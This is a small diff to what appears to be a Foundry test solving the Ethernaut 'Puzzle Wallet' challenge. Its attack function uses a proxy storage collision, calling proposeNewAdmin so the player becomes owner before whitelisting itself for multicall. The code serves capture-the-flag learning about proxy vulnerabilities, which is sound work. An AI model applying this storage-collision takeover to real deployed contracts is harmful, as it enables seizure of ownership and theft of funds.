@@ -38,7 +38,7 @@ contract PuzzleWalletTest is Test {
      */
     function attack() private {
         // become owner (thanks to storage collision)
-        proxy.proposeNewAdmin(player);
+        PuzzleProxy(payable(address(target))).proposeNewAdmin(player);
         require(target.owner() == player, "should become owner");
 
         // whitelist ourselves for the multicall in the next step
